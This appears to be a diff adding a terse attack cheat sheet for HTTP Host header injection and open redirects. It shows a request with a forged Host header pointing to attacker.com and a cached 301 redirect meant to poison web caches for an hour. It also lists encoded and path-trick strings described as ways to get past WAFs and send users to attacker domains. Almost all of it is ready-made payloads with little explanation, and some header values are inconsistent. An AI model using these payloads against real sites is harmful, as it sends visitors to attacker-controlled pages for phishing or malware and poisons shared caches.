@@ -1,0 +1,44 @@
+Examples[HTTP Host header redirection]:
+
+GET http://www.attackingsite.gov
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+Host: www.attacker.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+
+
+Reply if working: [two examples]
+
+
+Host redir with Location header and web caching:
+
+Cache-Control: public, max-age=3600 ## 1 hour of caching of the redirect to other page;
+Content-Length: 000
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 19 Apr 2019 22:52:58 GMT
+Expires: Fri, 19 Apr 2019 21:52:57 GMT
+Location: http://attacker.com
+
+-----------------------
+
+HTTP/1.1 301 Moved Permanently
+Location: http://attacker.com
+
+----------------------
+
+
+Some ways to bypass WAF and misconfiguration:
+
+"\\site.com"
+"\\site.com:80"
+"://remoteattacker.com:80"
+"..\www.attacker.com:80"
+"..//http://goo.gl"
+"%3A%2F%2Fremoteattacker.com:80"
+"%3A%2F%2Frealsite.com.fakesite.com/"
+
+
+
+Otherwise it can be redirect with the .htaccess, this will give you a faster load and you will not be able to see the actual website.
